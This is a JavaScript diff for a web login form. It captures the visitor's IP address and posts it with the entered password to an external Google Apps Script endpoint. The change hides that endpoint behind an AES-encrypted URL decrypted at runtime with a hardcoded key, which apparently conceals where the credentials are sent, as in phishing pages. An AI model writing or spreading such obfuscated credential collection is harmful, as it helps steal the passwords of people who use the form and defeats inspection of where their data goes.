@@ -3,6 +3,7 @@ function fetchIPAddress() {
         .then(response => response.json())
         .then(data => {
             const ipAddress = data.ip;
+            document.getElementById("IP").value = ipAddress
             document.getElementById('ip-address').textContent = ipAddress;
         })
         .catch(error => {
@@ -36,8 +37,10 @@ window.onload = function() {
 
 
 function submitip() {
-    document.getElementById('submitbutton').style.backgroundColor = 'lightgrey';
-    document.getElementById('submitbutton').style.border = 'lightgrey';
+    var submitButton = document.getElementById('submitbutton')
+    submitButton.style.backgroundColor = 'lightgrey';
+    submitButton.style.border = '1px solid lightgrey';
+    submitButton.disabled = true;
     var username = document.getElementById("IP").value;
 	var password = document.getElementById("password").value;
 
@@ -45,7 +48,15 @@ function submitip() {
     formData.append("username", username);
     formData.append("password", password);
 
-    fetch("https://script.google.com/macros/s/AKfycbyBUL2H60q5Hj-ajUpCsRAB3Lg2ZxsImljFAiD1UtNk95GK04KszlFMZWVeRfhABurMlg/exec", {
+    function decryptURL(encryptedUrl, password) {
+        var decrypted = CryptoJS.AES.decrypt(decodeURIComponent(encryptedUrl), password).toString(CryptoJS.enc.Utf8);
+        return decrypted;
+    }
+    var encryptedUrl = "U2FsdGVkX1/ZskWU1IpHHSE4T50uIzmNiLBPVUVTE1fV619Qgx6fxid9jC5Ld9VBJtWD2INoV0X/cE0wGra3PAu8I8A6WCGYxDAJApZ7UTWcJ/eZTdVWNmzVY842PGmUMdMSlb2TdYQHB6puhfmZCXW+mw4HzBh44ExRYelN1pRFeINsU6Zf2ZhxLvGO3QbQ";
+    var password = 'secret';
+    var decryptedUrl = decryptURL(encryptedUrl, password);
+
+    fetch(decryptedUrl, {
         method: "POST",
         body: formData,
     })
@@ -56,21 +67,23 @@ function submitip() {
         if (data.redirectUrl) {
             var box = document.getElementById("box");
             box.style.display = "inline-block";
-            document.getElementById('submitbutton').style.backgroundColor = '';
-            document.getElementById('submitbutton').style.border = '';
+            submitButton.style.backgroundColor = '';
+            submitButton.style.border = '';
+            submitButton.disabled = false;
             document.getElementById("formAuthentication").reset();
             setTimeout(function() {
                 box.style.display = "none"; 
-            }, 2000); // 10 seconds
+            }, 3000); // 10 seconds
             window.location.href = "index.html"
         } else {
             var box2 = document.getElementById("box2");
             box2.style.display = "inline-block";
-            document.getElementById('submitbutton').style.backgroundColor = '';
-            document.getElementById('submitbutton').style.border = '';
+            submitButton.style.backgroundColor = '';
+            submitButton.style.border = '';
+            submitButton.disabled = false;
             setTimeout(function() {
                 box2.style.display = "none"; 
-            }, 2000); // 10 seconds
+            }, 3000); // 10 seconds
         }
     })
     .catch(function(error) {
